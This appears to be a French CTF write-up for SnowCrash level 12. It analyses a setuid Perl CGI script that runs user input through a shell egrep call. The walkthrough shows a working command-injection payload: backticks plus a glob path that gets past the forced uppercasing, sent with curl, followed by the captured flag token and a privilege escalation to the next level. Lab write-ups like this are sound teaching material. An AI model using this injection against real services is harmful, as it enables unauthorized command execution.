# 12 - Perl exploit: user input

- On se connecte en tant que level12.
```
level12@SnowCrash:~$ ls -l
total 4
-rwsr-sr-x+ 1 flag12 level12 464 Mar  5  2016 level12.pl
```

- Un script perl nous a été laissé:
```perl
#!/usr/bin/env perl
# localhost:4646
use CGI qw{param};
print "Content-type: text/html\n\n";

sub t {
  $nn = $_[1];
  $xx = $_[0];
  $xx =~ tr/a-z/A-Z/;
  $xx =~ s/\s.*//;
  @output = `egrep "^$xx" /tmp/xd 2>&1`;
  foreach $line (@output) {
      ($f, $s) = split(/:/, $line);
      if($s =~ $nn) {
          return 1;
      }
  }
  return 0;
}

sub n {
  if($_[0] == 1) {
      print("..");
  } else {
      print(".");
  }
}

n(t(param("x"), param("y")));
```

- Ce script semble être conçu pour être exécuté par un [CGI](https://fr.wikipedia.org/wiki/Common_Gateway_Interface) à travers un service écoutant sur localhost à travers le port 4646. Il prend deux paramètres qui sont passés à la fonction `t()`, le retour de cette dernière est utilisé pour `print()` un message en conséquence.


- La fonction `t()` va transformer tous les caractères minuscules contenus dans son premier paramètre en majuscules, puis elle va effacer tous les caractères suivant un espace. La chaîne résultante (`$xx`) sera utilisée par `egrep "^$xx" /tmp/xd 2>&1`.


- `$xx =~ tr/a-z/A-Z/;` fait que nous ne pouvons pas directement envoyer `x=;getflag>/tmp/level12.flag` car tous nos caractères seront transformés en majuscules, du coup:
```
level12@SnowCrash:~$ ss -tunlp | grep 4646
tcp    LISTEN     0      128                   :::4646                 :::*
```

```
level12@SnowCrash:~$ echo "getflag > /tmp/level12.flag" > /tmp/EXPLOIT
```

```
level12@SnowCrash:~$ chmod +x /tmp/EXPLOIT
```

```
level12@SnowCrash:~$ curl -X POST -d "x=\`/*/EXPLOIT\`" http://127.0.0.1:4646
```

```
level12@SnowCrash:~cat /tmp/level12.flag46
Check flag.Here is your token : g1qKMiRpXf53AWhDaU7FEkczr
```

```
level12@SnowCrash:~$ su level13
Password:g1qKMiRpXf53AWhDaU7FEkczr
level13@SnowCrash:~$
```
